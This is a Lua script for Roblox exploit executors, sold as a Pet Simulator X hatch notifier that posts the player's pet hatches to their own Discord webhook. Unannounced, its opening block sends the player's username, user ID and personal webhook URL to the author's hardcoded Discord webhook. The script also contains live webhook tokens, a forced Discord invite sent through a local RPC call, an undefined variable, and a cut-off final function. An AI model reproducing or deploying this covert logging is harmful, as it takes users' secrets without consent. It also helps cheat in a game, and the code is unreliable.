if game.PlaceId == 6284583030 or game.PlaceId == 7722306047 then
	repeat wait() until game:GetService("Players")
	repeat wait() until game:GetService("Players").LocalPlayer
	repeat wait() until game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Loading"):WaitForChild("Black").BackgroundTransparency == 1
	repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

	local username = game:GetService("Players").LocalPlayer.Name
	local userid = game:GetService("Players").LocalPlayer.UserId
	local icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
	
    local OSTime = os.time()
    local Time = os.date('!*t', OSTime)
    local lobgerz = {
                    ["color"] = 0xfffff, --decimal
                    ["title"] = username.." just executed PSX Pet Hatcher",
                    ["description"] = username.."'s webhook url: " .. _G.Webhook,
                    ["thumbnail"] = {
                        ["url"] = icon
                    },
                    ["author"] = {["name"] = username, ["icon_url"] = icon, ["url"] = "https://www.roblox.com/users/"..userid.."/profile"  },
                    ["footer"] = {
                    ["text"] = "PSX Pet Hatcher Logs",
                },
                ['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
            }
            (syn and syn.request or http_request) {
                Url = 'https://discord.com/api/webhooks/970089962643017728/OSTQBKzdtjWvQCLS3-hbHai7SbE3cFG9fp7K37jxOguUZ9hL4itcF4H9sYUyY3fYXtNA';
                Method = 'POST';
                Headers = {
                    ['Content-Type'] = 'application/json';
                };
                Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { lobgerz } } );
            };
	
	if _G.DiscordNotification == true then 
        (syn and syn.request or http_request or request)({ Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",Headers = {["Content-Type"] = "application/json",
                ["Origin"] = "https://discord.com"},
                    Body = game:GetService("HttpService"):JSONEncode({cmd = "INVITE_BROWSER",
                        args = {code = "83aFw8rGM8"},
                            nonce = game:GetService("HttpService"):GenerateGUID(false)})})
    	end
	
	if _G.SendNotifications == true then
    	game.StarterGui:SetCore(
               	"SendNotification",
                {
			Title = "PSX Pet Hatcher",
			Text = "Version 2.6.3, Updated and Maintained by A&J Gaming#1569",
			Duration = 5
		}
	)
        
        game.StarterGui:SetCore(
		"SendNotification",
                {
                    	Title = "PSX Pet Hatcher",
                   	Text = "Hatch Counter resets after every execution. Looking for a fix currently",
                    	Duration = 5
               	}
        )
	elseif _G.SendNotifications == false then
        end
	
	local BasicCount = _G.BasicCounter
	local RareCount = _G.RareCounter
	local EpicCount = _G.EpicCounter
	local LegendaryCount = _G.LegendaryCounter
	local MythicalCount = _G.MythicalCounter
	local ExclusiveCount = _G.ExclusiveCounter
	
	function abb(Value)
		local Number
		local Formatted = Value
		while true do
        		Formatted, Number = string.gsub(Formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
        		if (Number == 0) then
            			break
        		end
    		end
    		return Formatted
	end
	
	local Library = require(game:GetService("ReplicatedStorage").Framework.Library)
	local IDToName = {}
	local PettoRarity = {}
	for i,v in pairs(Library.Directory.Pets) do
		IDToName[i] = v.name
		PettoRarity[i] = v.rarity
	end

	function GetThumbnail(id, type)
		if tostring(id) == "292" and type == 'Gold' then -- Ty for the help tense :D
            local eeee = "https://cdn.discordapp.com/attachments/750156768834879488/970537516987986020/Huge_Hacked_Cat_Normal.png"
            return eeee
		elseif tostring(id) == "292" then
			local eeee = "https://cdn.discordapp.com/attachments/750156768834879488/950290634332311572/420.png"
            return eeee
		elseif tostring(id) == "331" and type == 'Gold' then
			local eeee = "https://media.discordapp.net/attachments/750156768834879488/969854714642563082/unknown.png"
			return eeee
		elseif tostring(id) == "331" then
			local eeee = "https://media.discordapp.net/attachments/750156768834879488/969854809500962816/unknown.png"
			return eeee
		elseif tostring(id) == "288" and type == 'Gold' then
			local eeee = "https://media.discordapp.net/attachments/750156768834879488/970127122607792148/unknown.png"
			return eeee
		elseif tostring(id) == "288" then
			local eeee = "https://cdn.discordapp.com/attachments/750156768834879488/970126329695596604/unknown.png"
			return eeee
		elseif tostring(id) == "327" and type == 'Gold' then
			local eeee = "https://media.discordapp.net/attachments/750156768834879488/970127693268008990/unknown.png"
			return eeee
		elseif tostring(id) == "327" then
			local eeee = "https://media.discordapp.net/attachments/750156768834879488/970127489554841660/unknown.png"
			return eeee
		elseif tostring(id) == "316" and type == 'Gold' then
            local eeee = "https://media.discordapp.net/attachments/750156768834879488/970541777876582421/unknown_12.png"
            return eeee
		elseif tostring(id) == "316" then
            local eeee = "https://media.discordapp.net/attachments/750156768834879488/970542245541457971/unknown.png"
            return eeee
            end
		
		local nailname = (type == 'Normal' or type == 'Rainbow' and 'thumbnail') or (type == 'Gold' and 'goldenThumbnail') or (type == 'Dark Matter' and 'darkMatterThumbnail')
		local eeee = Library.Directory.Pets[tostring(id)][nailname] or Library.Directory.Pets[tostring(id)]["thumbnail"] 
		local eeee = eeee:gsub("rbxassetid%:%/%/", "")
		local eeee = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", eeee)
		return eeee
	end
	function GetChance(PetID)
		local Chance = "0"
		for q,w in pairs(game.ReplicatedStorage.Game.Eggs:GetChildren()) do
		    for e,r in pairs(w:GetChildren()) do
			for k,l in pairs(r:GetChildren()) do --inside
			    if l:IsA("ModuleScript") then
				if type(require(l).drops) == "table" then
				    for o,p in pairs(require(l).drops) do
					if p[1] == PetID then
					    Chance = p[2]
					    return Chance
					end
				    end
				end
			    end
			end
		    end
		end
		return Chance
	end
    
    	function Send(Name, Nickname, Strength, Rarity, Thumbnail, Formation, Color, NewPowers, nth, Hatchping, chance, PetName, FooterRarity, NewColor)
    		local Counter = (FooterRarity == 'Mythical' and MythicalCount) or (FooterRarity == 'Golden Mythical' and MythicalCount) or (FooterRarity == 'Rainbow Mythical' and MythicalCount) or (FooterRarity == 'Dark Matter Mythical' and MythicalCount) or (FooterRarity == 'Exclusive' and ExclusiveCount) or (FooterRarity == 'Golden Exclusive' and ExclusiveCount) or (FooterRarity == 'Rainbow Exclusive' and ExclusiveCount) or (FooterRarity == 'Dark Matter Exclusive' and ExclusiveCount) or (FooterRarity == 'Epic' and EpicCount) or (FooterRarity == 'Golden Epic' and EpicCount) or (FooterRarity == 'Rainbow Epic' and EpicCount) or (FooterRarity == 'Dark Matter Epic' and EpicCount) or (FooterRarity == 'Legendary' and LegendaryCount) or (FooterRarity == 'Golden Legendary' and LegendaryCount) or (FooterRarity == 'Rainbow Legendary' and LegendaryCount) or (FooterRarity == 'Dark Matter Legendary' and LegendaryCount) or (FooterRarity == 'Rare' and RareCount) or (FooterRarity == 'Golden Rare' and RareCount) or (FooterRarity == 'Rainbow Rare' and RareCount) or (FooterRarity == 'Dark Matter Rare' and RareCount) or (FooterRarity == 'Basic' and BasicCount) or (FooterRarity == 'Golden Basic' and BasicCount) or (FooterRarity == 'Rainbow Basic' and BasicCount) or (FooterRarity == 'Dark Matter Basic' and BasicCount)
            	 if FooterRarity == 'Mythical' then
        			MythicalCount = MythicalCount + 1
        		elseif FooterRarity == 'Golden Mythical' then
        			MythicalCount = MythicalCount + 1
        		elseif FooterRarity == 'Rainbow Mythical' then
        			MythicalCount = MythicalCount + 1
        		elseif FooterRarity == 'Dark Matter Mythical' then
        			MythicalCount = MythicalCount + 1
        		end
        		if FooterRarity == 'Exclusive' then 
        			ExclusiveCount = ExclusiveCount + 1
        		elseif FooterRarity == 'Golden Exclusive' then
        			ExclusiveCount = ExclusiveCount + 1
        		elseif FooterRarity == 'Rainbow Exclusive' then
        			ExclusiveCount = ExclusiveCount + 1 
        		elseif FooterRarity == 'Dark Matter Exclusive' then 
        			ExclusiveCount = ExclusiveCount + 1
        		end
        		if FooterRarity == 'Epic' then
        			EpicCount = EpicCount + 1 
        		elseif FooterRarity == 'Golden Epic' then
        			EpicCount = EpicCount + 1
        		elseif FooterRarity == 'Rainbow Epic' then
        			EpicCount = EpicCount + 1 
        		elseif FooterRarity == 'Dark Matter Epic' then
        			EpicCount = EpicCount + 1 
        		end
        		if FooterRarity == 'Legendary' then 
        			LegendaryCount = LegendaryCount + 1 
        		elseif FooterRarity == 'Golden Legendary' then 
        			LegendaryCount = LegendaryCount + 1
        		elseif FooterRarity == 'Rainbow Legendary' then
        			LegendaryCount = LegendaryCount + 1 
        		elseif FooterRarity == 'Dark Matter Legendary' then
        			LegendaryCount = LegendaryCount + 1
        		end
        		if FooterRarity == 'Rare' then
        			RareCount = RareCount + 1
        		elseif FooterRarity == 'Golden Rare' then 
        			RareCount = RareCount + 1
        		elseif FooterRarity == 'Rainbow Rare' then 
        			RareCount = RareCount + 1 
        		elseif FooterRarity == 'Dark Matter Rare' then 
        			RareCount = RareCount + 1 
        		end
        		if FooterRarity == 'Basic' then
        			BasicCount = BasicCount + 1 
        		elseif FooterRarity == 'Golden Basic' then 
        			BasicCount = BasicCount + 1 
        		elseif FooterRarity == 'Rainbow Basic' then 
        			BasicCount = BasicCount + 1 
        		elseif FooterRarity == ' Dark Matter Basic' then 
        		    BasicCount = BasicCount + 1
        		end
        	
        	local crackedegg = Library.Save.Get().EggsOpened["Cracked Egg"]
        	local rainbowpixelegg = Library.Save.Get().EggsOpened["Rainbow Pixel Egg"]
            local hackeregg = Library.Save.Get().EggsOpened["Hacker Egg"]
            local hellegg = Library.Save.Get().EggsOpened["Hell Egg"]
            local hauntedegg = Library.Save.Get().EggsOpened["Haunted Egg"]
            local enchantedegg = Library.Save.Get().EggsOpened["Enchanted Egg"]
            local goldenenchantedegg = Library.Save.Get().EggsOpened["Golden Enchanted Egg"]
            local goldenhauntedegg = Library.Save.Get().EggsOpened["Golden Haunted Egg"]
            local goldenrainbowegg = Library.Save.Get().EggsOpened["Golden Rainbow Egg"]
            local goldenrelicegg = Library.Save.Get().EggsOpened["Golden Relic Egg"]
            local goldensamuraiegg = Library.Save.Get().EggsOpened["Golden Samurai Egg"]
            local rainbowegg = Library.Save.Get().EggsOpened["Rainbow Egg"]
            local relicegg = Library.Save.Get().EggsOpened["Relic Egg"]
            local samuraiegg = Library.Save.Get().EggsOpened["Samurai Egg"]
            local goldenhellegg = Library.Save.Get().EggsOpened["Golden Hell Egg"]
            local heavenegg = Library.Save.Get().EggsOpened["Heaven Egg"]
            local goldenheavenegg = Library.Save.Get().EggsOpened["Golden Heaven Egg"]
            local empyreanegg = Library.Save.Get().EggsOpened["Empyrean Egg"]
            local goldenempyreanegg = Library.Save.Get().EggsOpened["Golden Empyrean Egg"]
            local snowegg = Library.Save.Get().EggsOpened["Snow Egg"]
            local coconutegg = Library.Save.Get().EggsOpened["Coconut Egg"]
            local cactusegg = Library.Save.Get().EggsOpened["Cactus Egg"]
            local beachballegg = Library.Save.Get().EggsOpened["Beachball Egg"]
            local geodeegg = Library.Save.Get().EggsOpened["Geode Egg"]
            local goldenbeachballegg = Library.Save.Get().EggsOpened["Golden Beachball Egg"]
            local goldencactusegg = Library.Save.Get().EggsOpened["Golden Cactus Egg"]
            local goldencoconutegg = Library.Save.Get().EggsOpened["Golden Coconut Egg"]
            local goldencrackedegg = Library.Save.Get().EggsOpened["Golden Cracked Egg"]
            local goldengeodeegg = Library.Save.Get().EggsOpened["Golden Geode Egg"]
            local goldengrassegg = Library.Save.Get().EggsOpened["Golden Grass Egg"]
            local goldeniceegg = Library.Save.Get().EggsOpened["Golden Ice Egg"]
            local icicleegg = Library.Save.Get().EggsOpened["Icicle Egg"]
            local goldenobsidianegg = Library.Save.Get().EggsOpened["Golden Obsidian Egg"]
            local goldenmagmaegg = Library.Save.Get().EggsOpened["Golden Magma Egg"]
            local rockegg = Library.Save.Get().EggsOpened["Rock Egg"]
            local spikedegg = Library.Save.Get().EggsOpened["Spiked Egg"]
            local goldenspottedegg = Library.Save.Get().EggsOpened["Golden Spotted Egg"]
            local goldenwoodegg = Library.Save.Get().EggsOpened["Golden Wood Egg"]
            local goldenyetiegg = Library.Save.Get().EggsOpened["Golden Yeti Egg"]
            local grassegg = Library.Save.Get().EggsOpened["Grass Egg"]
            local iceegg = Library.Save.Get().EggsOpened["Ice Egg"]
            local goldenicicleegg = Library.Save.Get().EggsOpened["Golden Icicle Egg"]
            local goldenrockegg = Library.Save.Get().EggsOpened["Golden Rock Egg"]
            local goldenspikedegg = Library.Save.Get().EggsOpened["Golden Spiked Egg"]
            local spottedegg = Library.Save.Get().EggsOpened["Spotted Egg"]
            local woodegg = Library.Save.Get().EggsOpened["Wood Egg"]
            local yetiegg = Library.Save.Get().EggsOpened["Yeti Egg"]
            local metalegg = Library.Save.Get().EggsOpened["Metal Egg"]
            local goldenmetalegg = Library.Save.Get().EggsOpened["Golden Metal Egg"]
            local techegg = Library.Save.Get().EggsOpened["Tech Egg"]
            local goldentechegg = Library.Save.Get().EggsOpened["Golden Tech Egg"]
            local titaniumegg = Library.Save.Get().EggsOpened["Titanium Egg"]
            local goldentitaniumegg = Library.Save.Get().EggsOpened["Golden Titanium Egg"]
            local darktechegg = Library.Save.Get().EggsOpened["Dark Tech Egg"]
            local goldendarktechegg = Library.Save.Get().EggsOpened["Golden Dark Tech Egg"]
            local steampunkegg = Library.Save.Get().EggsOpened["Steampunk Egg"]
            local goldensteampunkegg = Library.Save.Get().EggsOpened["Golden Steampunk Egg"]
            local mechanicalegg = Library.Save.Get().EggsOpened["Mechanical Egg"]
            local goldenmechanicalegg = Library.Save.Get().EggsOpened["Golden Mechanical Egg"]
            local labegg = Library.Save.Get().EggsOpened["Lab Egg"]
            local goldenlabegg = Library.Save.Get().EggsOpened["Golden Lab Egg"]
            local chemicalegg = Library.Save.Get().EggsOpened["Chemical Egg"]
            local goldenchemicalegg = Library.Save.Get().EggsOpened["Golden Chemical Egg"]
            local alienegg = Library.Save.Get().EggsOpened["Alien Egg"]
            local goldenalienegg = Library.Save.Get().EggsOpened["Golden Alien Egg"]
            local martianegg = Library.Save.Get().EggsOpened["Martian Egg"]
            local goldenmartianegg = Library.Save.Get().EggsOpened["Golden Martian Egg"]
            local planetegg = Library.Save.Get().EggsOpened["Planet Egg"]
            local goldenplanetegg = Library.Save.Get().EggsOpened["Golden Planet Egg"]
            local goldenglitchegg = Library.Save.Get().EggsOpened["Golden Glitch Egg"]
            local glitchegg = Library.Save.Get().EggsOpened["Glitch Egg"]
            local goldenhackeregg = Library.Save.Get().EggsOpened["Golden Hacker Egg"]
            local axolotlegg = Library.Save.Get().EggsOpened["Axolotl Egg"]
            local goldenaxolotlegg = Library.Save.Get().EggsOpened["Golden Axolotl Egg"]
            local goldenshinyaxolotlegg = Library.Save.Get().EggsOpened["Golden Shiny Axolotl Egg"]
            local shinyaxolotlegg = Library.Save.Get().EggsOpened["Shiny Axolotl Egg"]
            local goldenpixelegg = Library.Save.Get().EggsOpened["Golden Pixel Egg"]
            local pixelegg = Library.Save.Get().EggsOpened["Pixel Egg"]
            local goldenspottedpixelegg = Library.Save.Get().EggsOpened["Golden Spotted Pixel Egg"]
            local spottedpixelegg = Library.Save.Get().EggsOpened["Spotted Pixel Egg"]
            local goldenrainbowpixelegg = Library.Save.Get().EggsOpened["Golden Rainbow Pixel Egg"]
            
            local goldenrainbowpixeleggs = (goldenrainbowpixelegg == nil and "0") or goldenrainbowpixelegg
            local goldenspottedpixeleggs = (goldenspottedpixelegg == nil and "0") or goldenspottedpixelegg
            local spottedpixeleggs = (spottedpixelegg == nil and "0") or spottedpixelegg
            local goldenpixeleggs = (goldenpixelegg == nil and "0") or goldenpixelegg
            local pixeleggs = (pixelegg == nil and "0") or pixelegg
            local goldenshinyaxolotleggs = (goldenshinyaxolotlegg == nil and "0") or goldenshinyaxolotlegg
            local shinyaxolotleggs = (shinyaxolotlegg == nil and "0") or shinyaxolotlegg
            local goldenaxolotleggs = (goldenaxolotlegg == nil and "0") or goldenaxolotlegg
            local axolotleggs = (axolotlegg == nil and "0") or axolotlegg
            local goldencrackedeggs = (goldencrackedegg == nil and "0") or goldencrackedegg
            local goldenglitcheggs = (goldenglitchegg == nil and "0") or goldenglitchegg
            local glitcheggs = (glitchegg == nil and "0") or glitchegg
            local goldenplaneteggs = (goldenplanetegg == nil and "0") or goldenplanetegg
            local planeteggs = (planetegg == nil and "0") or planetegg
            local goldenmartianeggs = (goldenmartianegg == nil and "0") or goldenmartianegg
            local martianeggs = (martianegg == nil and "0") or martianegg
            local goldenalieneggs = (goldenalienegg == nil and "0") or goldenalienegg
            local alieneggs = (alienegg == nil and "0") or alienegg
            local goldenchemicaleggs = (goldenchemicalegg == nil and "0") or goldenchemicalegg
            local chemicaleggs = (chemicalegg == nil and "0") or chemicalegg
            local goldenlabeggs = (goldenlabegg == nil and "0") or goldenlabegg
            local labeggs = (labegg == nil and "0") or labegg
            local goldenmechanicaleggs = (goldenmechanicalegg == nil and "0") or goldenmechanicalegg
            local mechanicaleggs = (mechanicalegg == nil and "0") or mechanicalegg 
            local goldensteampunkeggs = (goldensteampunkegg == nil and "0") or goldensteampunkegg
            local steampunkeggs = (steampunkegg == nil and "0") or steampunkegg
            local goldendarktecheggs = (goldendarktechegg == nil and "0") or goldendarktechegg
            local darktecheggs = (darktechegg == nil and "0") or darktechegg
            local goldentitaniumeggs = (goldentitaniumegg == nil and "0") or goldentitaniumegg
            local titaniumeggs = (titaniumegg == nil and "0") or titaniumegg
            local goldentecheggs = (goldentechegg == nil and "0") or goldentechegg
            local techeggs = (techegg == nil and "0") or techegg
            local goldenmetaleggs = (goldenmetalegg == nil and "0") or goldenmetalegg
            local metaleggs = (metalegg == nil and "0") or metalegg
            local goldenyetieggs = (goldenyetiegg == nil and "0") or goldenyetiegg
            local yetieggs = (yetiegg == nil and "0") or yetiegg
            local goldenwoodeggs = (goldenwoodegg == nil and "0") or goldenwoodegg 
            local woodeggs = (woodegg == nil and "0") or woodegg
            local goldenspottedeggs = (goldenspottedegg == nil and "0") or goldenspottedegg
            local spottedeggs = (spottedegg == nil and "0") or spottedegg
            local goldeniceeggs = (goldeniceegg == nil and "0") or goldeniceegg
            local iceeggs = (iceegg == nil and "0") or iceegg
            local goldengrasseggs = (goldengrassegg == nil and "0") or goldengrassegg
            local grasseggs = (grassegg == nil and "0") or grassegg
            local goldenspikedeggs = (goldenspikedegg == nil and "0") or goldenspikedegg
            local spikedeggs = (spikedegg == nil and "0") or spikedegg
            local goldenrockeggs = (goldenrockegg == nil and "0") or goldenrockegg
            local rockeggs = (rockegg == nil and "0") or rockegg
            local goldenicicleeggs = (goldenicicleegg == nil and "0") or goldenicicleegg
            local icicleeggs = (icicleegg == nil and "0") or icicleegg 
            local goldengeodeeggs = (goldengeodeegg == nil and "0") or goldengeodeegg 
            local geodeeggs = (geodeegg == nil and "0") or geodeegg
            local goldenbeachballeggs = (goldenbeachballegg == nil and "0") or goldenbeachballegg
            local beachballeggs = (beachballegg == nil and "0") or beachballegg
            local goldencactuseggs = (goldencactusegg == nil and "0") or goldencactusegg
            local cactuseggs = (cactusegg == nil and "0") or cactusegg 
            local goldencoconuteggs = (goldencoconutegg == nil and "0") or goldencoconutegg
            local coconuteggs = (coconutegg == nil and "0") or coconutegg 
            local goldensnoweggs = (goldensnowegg == nil and "0") or goldensnowegg
            local snoweggs = (snowegg == nil and "0") or snowegg 
            local goldenempyreaneggs = (goldenempyreanegg == nil and "0") or goldenempyreanegg
            local empyreaneggs = (empyreanegg == nil and "0") or empyreanegg 
            local goldenheaveneggs = (goldenheavenegg == nil and "0") or goldenheavenegg
            local heaveneggs = (heavenegg == nil and "0") or heavenegg 
            local goldensamuraieggs = (goldensamuraiegg == nil and "0") or goldensamuraiegg
            local samuraieggs = (samuraiegg == nil and "0") or samuraiegg
            local goldenreliceggs = (goldenrelicegg == nil and "0") or goldenrelicegg
            local reliceggs = (relicegg == nil and "0") or relicegg
            local goldenrainboweggs = (goldenrainbowegg == nil and "0") or goldenrainbowegg
            local rainboweggs = (rainbowegg == nil and "0") or rainbowegg
            local goldenenchantedeggs = (goldenenchantedegg == nil and "0") or goldenenchantedegg
            local enchantedeggs = (enchantedegg == nil and "0") or enchantedegg
        	local goldenhauntedeggs = (goldenhauntedegg == nil and "0") or goldenhauntedegg
        	local hauntedeggs = (hauntedegg == nil and "0") or hauntedegg 
        	local goldenhelleggs = (hellegg == nil and "0") or goldenhellegg 
        	local helleggs = (hellegg == nil and "0") or hellegg 
        	local hackereggs = (hackeregg == nil and "0") or hackeregg
        	local goldenhackereggs = (goldenhackeregg == nil and "0") or goldenhackeregg
            local crackedeggs = (crackedegg == nil and "0") or crackedegg
            local rainbowpixeleggs = (rainbowpixelegg == nil and "0") or rainbowpixelegg
            
    		local Library = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
            local NewEgg = rainbowpixeleggs + crackedeggs + goldenhackereggs + hackereggs + helleggs + goldenhelleggs + hauntedeggs + goldenhauntedeggs + enchantedeggs + goldenenchantedeggs + rainboweggs + goldenrainboweggs + goldenrainboweggs + reliceggs + goldenreliceggs + samuraieggs + goldensamuraieggs + heaveneggs + goldenheaveneggs + empyreaneggs + goldenempyreaneggs + snoweggs + goldensnoweggs + coconuteggs + goldencoconuteggs + cactuseggs + goldencactuseggs + beachballeggs + goldenbeachballeggs + geodeeggs + goldengeodeeggs + icicleeggs + goldenicicleeggs + rockeggs + goldenrockeggs + spikedeggs + goldenspikedeggs + grasseggs + goldengrasseggs + iceeggs + goldeniceeggs + spottedeggs + goldenspottedeggs + woodeggs + goldenwoodeggs + yetieggs + goldenyetieggs + metaleggs + goldenmetaleggs + techeggs + goldentecheggs + titaniumeggs + goldentitaniumeggs + darktecheggs + goldendarktecheggs + steampunkeggs + goldensteampunkeggs + mechanicaleggs + goldenmechanicaleggs + labeggs + goldenlabeggs + chemicaleggs + goldenchemicaleggs + alieneggs + goldenalieneggs + martianeggs + goldenmartianeggs + planeteggs + goldenplaneteggs + glitcheggs + goldenglitcheggs + goldencrackedeggs + axolotleggs + goldenaxolotleggs + shinyaxolotleggs + goldenshinyaxolotleggs + pixeleggs + goldenpixeleggs + goldenpixeleggs + spottedpixeleggs + goldenspottedpixeleggs + goldenrainbowpixeleggs
            local HatchAmountCounter = (_G.HatchType == 'hatch' and "Hatch Amount: " .. abb(Counter)) or (_G.HatchType == 'eggs' and "Egg #" .. abb(NewEgg)) or (_G.HatchType == 'PSX' and "Pet Simulator X")
    		local OSTime = os.time()
    		local Time = os.date('!*t', OSTime)
    		local Webhook = _G.Webhook
    		local msg = {
    			["content"] = Hatchping,
    			["embeds"] = {
    				{
    					["color"] = tonumber(tostring("0x" .. NewColor)), --decimal
    					["title"] = "",
    					["thumbnail"] = {
    						["url"] = Thumbnail
    					},
    					["description"] = username .. " just hatched a **" .. PetName .. "**! (**" .. chance .. "%**)",
    					["fields"] = {},
    					["author"] = {
    						["name"] = username,
    						["url"] = "https://www.roblox.com/users/".. userid .."/profile",
    						["icon_url"] = icon,
    					},
    					["footer"] = {
    						["text"] = HatchAmountCounter .. " | " .. FooterRarity,
    					},
    					['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    				}
    			}
    		}
    		request = http_request or request or HttpPost or syn.request
    		request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    		if Name == 'Huge Hacked Cat' or Name == 'Huge Pixel Cat' or Name == 'Huge Super Corgi' or Name == 'Huge Rainbow Unicorn' then
    			local OSTime = os.time()
    			local Time = os.date('!*t', OSTime)
    			local Webhook = "https://discord.com/api/webhooks/973087439612678164/gXVfu0hUkn1_6EpjrBIi6q4gTd0XB3N_7HlwfrR8HhuE07YV79kotFPlMXT3869SolOt"
    			local msg = {
    				["content"] = username .. " just hatched an Exclusive Pet!",
    				["embeds"] = {
    					{
    						["color"] = tonumber(tostring("0x" .. NewColor)), --decimal
    						["title"] = "",
    						["thumbnail"] = {
    							["url"] = Thumbnail
    					},
    						["description"] = username .. " just hatched a **" .. PetName .. "**! (**" .. chance .. "%**)",
    						["fields"] = {},
    						["author"] = {
    							["name"] = username,
    							["url"] = "https://www.roblox.com/users/".. userid .."/profile",
    							["icon_url"] = icon,
    						},
    						["footer"] = {
    							["text"] = "Pet Simulator X Hatcher Logs | Egg #" .. abb(NewEgg) .. " | " .. FooterRarity,
    						},
    						['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    					}
    				}
    			}
    			request = http_request or request or HttpPost or syn.request
    			request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    			
    			local OSTime = os.time()
    			local Time = os.date('!*t', OSTime)
    			local Webhookss = "https://discord.com/api/webhooks/972679013761953822/0MTamcS0ECtCuN59bUCfNcZqYK1TAZ-FujHHfSaKJPJJIBdpkcc1e-ejFUJ-jIKG0omc"
    			local msg = {
    				["content"] = "",
    				["embeds"] = {
    					{
    						["color"] = tonumber(tostring("0x" .. NewColor)), --decimal
    						["title"] =  "Congrats! An Exclusive Pet has been hatched!",
    						["thumbnail"] = {
    							["url"] = Thumbnail
    					},
    						["description"] = " Someone hatched an **" .. PetName .. "**! (**" .. chance .. "%**)",
    						["fields"] = {},
    						["author"] = {
    							["name"] = "Not Affliated with BIG Games",
    							["url"] = "",
    							["icon_url"] = "",
    						},
    						["footer"] = {
    							["text"] = "PSX Hatches (Global) | PH Bot",
    						},
    						['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    					}
    				}
    			}
    			request = http_request or request or HttpPost or syn.request
    			request({Url = Webhookss, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    		end
    	end

	function SendWebhook(uid)
	    wait(.2)
        local dontsend = false
        if string.find(game.Players.LocalPlayer.PlayerGui.Message.Frame.Desc.Text, "Trade successfully completed!") and game.Players.LocalPlayer.PlayerGui.Message.Enabled == true or game.Players.LocalPlayer.PlayerGui.Trading.Frame.Trade.Visible == true then
            dontsend = true
        end
        if string.find(game.Players.LocalPlayer.PlayerGui.Message.Frame.Desc.Text, "Success!") and game.Players.LocalPlayer.PlayerGui.Message.Enabled == true or game.Players.LocalPlayer.PlayerGui.Bank.Frame.Processing.Visible == true then
            dontsend = true
        end
		for i,v in pairs(Library.Save.Get().Pets) do
			if v.uid == uid and _G.TrackList[PettoRarity[v.id]] then
				local ThingyThingyTempTypeThing = (v.g and 'Gold') or (v.r and 'Rainbow') or (v.dm and 'Dark Matter') or ''
				local Formation = (v.g and ':crown: Golden') or (v.r and ':rainbow: Rainbow') or (v.dm and ':milky_way: Dark Matter') or ''
				local Thumbnail = GetThumbnail(v.id, ThingyThingyTempTypeThing)
				local Name = IDToName[v.id]
				local Nickname = v.nk
				local nth = v.idt
				local Strength = v.s or {'???'}
				local Powers = v.powers or {}
				local Rarity = PettoRarity[v.id]
				local FooterRarity = (ThingyThingyTempTypeThing == 'Gold' and "Golden " .. Rarity) or (ThingyThingyTempTypeThing == 'Rainbow' and "Rainbow " .. Rarity) or (ThingyThingyTempTypeThing == 'Dark Matter' and "Dark Matter " .. Rarity) or Rarity
				local NewColor = (FooterRarity == 'Basic' and "b0b0b0") or (FooterRarity == 'Golden Basic' and "fff700") or (FooterRarity == 'Rainbow Basic' and "ff0000") or (FooterRarity == 'Dark Matter Basic' and "d400ff") or (FooterRarity == 'Rare' and "42ff5e") or (FooterRarity == 'Golden Rare' and "fff700") or (FooterRarity == 'Rainbow Rare' and "ff0000") or (FooterRarity == 'Dark Matter Rare' and "d400ff") or (FooterRarity == 'Epic' and "9500ff") or (FooterRarity == 'Golden Epic' and "fff700") or (FooterRarity == 'Rainbow Epic' and "ff0000") or (FooterRarity == 'Dark Matter Epic' and "d400ff") or (FooterRarity == 'Legendary' and "00f2ff") or (FooterRarity == 'Golden Legendary' and "fff700") or (FooterRarity == 'Rainbow Legendary' and "ff0000") or (FooterRarity == 'Dark Matter Legendary' and "d400ff") or (FooterRarity == 'Mythical' and "ff8c00") or (FooterRarity == 'Golden Mythical' and "fff700") or (FooterRarity == 'Rainbow Mythical' and "ff0000") or (FooterRarity == 'Dark Matter Mythical' and "d400ff") or (FooterRarity == 'Exclusive' and "d06bff") or (FooterRarity == 'Golden Exclusive' and "fff700") or (FooterRarity == 'Rainbow Exclusive' and "ff0000") or (FooterRarity == 'Dark Matter Exclusive' and "d400ff")
				local PetName = (ThingyThingyTempTypeThing == 'Gold' and Formation .. " " .. Rarity .. " " .. Name) or (ThingyThingyTempTypeThing == 'Rainbow' and Formation .. " " .. Rarity .. " " .. Name) or (ThingyThingyTempTypeThing == 'Dark Matter' and Formation .. " " .. Rarity .. " " .. Name) or Rarity .. " " .. Name
				local Chance = GetChance(v.id)
				local chance = (ThingyThingyTempTypeThing == 'Gold' and Chance / 8) or (ThingyThingyTempTypeThing == 'Rainbow' and Chance / 23.52941176470588) or (ThingyThingyTempTypeThing == 'Dark Matter' and Chance * 1) or Chance * 1
				local Basicrarity = _G.Basicping
				local Rarerarity = _G.Rareping
				local Epicrarity = _G.Epicping
				local Legendaryrarity = _G.Legendaryping
				local Mythicalrarity = _G.Mythicalping
				local Exclusiverarity = _G.Exclusiveping
				local Hatchping = (Rarity == 'Basic' and Basicrarity) or (Rarity == 'Rare' and Rarerarity) or (Rarity == 'Epic' and Epicrarity) or (Rarity == 'Legendary' and Legendaryrarity) or (Rarity == 'Mythical' and Mythicalrarity) or (Rarity == 'Exclusive' and Exclusiverarity)
